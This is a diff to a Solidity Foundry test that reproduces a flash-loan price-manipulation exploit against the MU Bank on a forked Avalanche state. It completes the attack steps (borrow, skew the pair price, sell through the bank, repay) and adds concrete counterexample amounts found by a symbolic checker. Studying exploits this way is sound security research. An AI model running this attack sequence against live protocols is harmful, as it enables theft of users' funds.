@@ -27,7 +27,7 @@ contract MUMUGTest is Test, BlockLoader {
 
     // Load from cheats.createSelectFork("Avalanche", 23435294);
     uint256 totalSupplyUSDCE = 193102891951559;
-    uint256 totalSupplyMU = 2000000000000000000000000;
+    uint256 totalSupplyMU = 2000000 ether;
 
     uint112 reserve0 = 110596398651;
     uint112 reserve1 = 172739951491310439336991;
@@ -40,7 +40,7 @@ contract MUMUGTest is Test, BlockLoader {
     uint256 pairBalance0 = 110596398651;
     uint256 pairBalance1 = 172739951491310439336991;
 
-    uint256 bankBalanceMU = 100000 * 10e18;
+    uint256 bankBalanceMU = 100000 ether;
 
     function setUp() public {
         vm.startPrank(owner);
@@ -67,7 +67,12 @@ contract MUMUGTest is Test, BlockLoader {
         );
         usdc_e.transfer(address(pair), pairBalance0);
         mu.transfer(address(pair), pairBalance1);
-        factory = new UniswapV2Factory(address(0xdead), address(pair), address(0x0), address(0x0));
+        factory = new UniswapV2Factory(
+            address(0xdead),
+            address(pair),
+            address(0x0),
+            address(0x0)
+        );
         router = new UniswapV2Router(address(factory), address(0xdead));
 
         // Initialize Bank
@@ -113,7 +118,7 @@ contract MUMUGTest is Test, BlockLoader {
     }
 
     function borrow_ERC20Basic(uint256 amount) internal {
-        mu.transfer(self(), amount);
+        mu.transferFrom(owner, self(), amount);
     }
 
     function flashLoanPayback(uint256 amount) internal {
@@ -171,40 +176,58 @@ contract MUMUGTest is Test, BlockLoader {
         // Step 1, mock to flashloan MU.
         borrow_ERC20Basic(amt0);
 
+        printBalance("After flashloan: ");
+
         // Step 2, swap MU to USDCE at uniswapPair, it will manipulate the price of MU/USDCE in MU bank.
         swapMUToUSDCByPair(amt1);
 
-        // print("After swap1: ");
+        printBalance("After swap1: ");
 
         // Step 3, do the manipulated sell of MU.
-        // swapUSDCToMUByBank(amt2);
+        swapUSDCToMUByBank(amt2);
 
-        // // print("After swap2: ");
+        printBalance("After swap2: ");
 
-        // // Step 4, payback the flashloan.
-        // flashLoanPayback(amt3);
+        require(mu.balanceOf(self()) > amt3);
 
-        // printBalance("After exploit: ");
+        // Step 4, payback the flashloan.
+        flashLoanPayback(amt3);
+
+        printBalance("After exploit: ");
     }
 
     function test_gt() public {
         uint256 flashloanAmt = (mu.balanceOf(address(bank)) * 990) / 1000;
         uint256 swapAmt = flashloanAmt;
-        uint256 sendAmt = 946 * 10e18;
-        uint256 paybackAmt = flashloanAmt + 30 ether;
+        uint256 sendAmt = 22980 ether;
+        uint256 paybackAmt = flashloanAmt + 300 ether;
         attackTemp(flashloanAmt, swapAmt, sendAmt, paybackAmt);
         require(attackGoal(), "Attack failed!");
     }
 
     function check_gt(
-        uint256 flashloanAmt,
-        uint256 swapAmt,
-        uint256 sendAmt,
-        uint256 paybackAmt
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3
     ) public {
-        vm.assume(flashloanAmt == swapAmt);
-        vm.assume(paybackAmt == flashloanAmt + 30 ether);
-        attackTemp(flashloanAmt, swapAmt, sendAmt, paybackAmt);
+        vm.assume(amt0 == amt1);
+        vm.assume(amt3 == amt0 + 300 ether);
+        vm.assume(amt0 > 0);
+        vm.assume(amt1 > 0);
+        vm.assume(amt2 > 0);
+        vm.assume(amt3 > 0);
+        attackTemp(amt0, amt1, amt2, amt3);
         assert(!attackGoal());
+    }
+
+    function test_halmos_gt() public {
+        attackTemp(
+            0xc0fce9b8623f93873e2,
+            0xc0fce9b8623f93873e2,
+            0x4d2053fdf95000053e0,
+            0xc2011f1a0ac226873e2
+        );
+        require(attackGoal(), "Attack failed!");
     }
 }
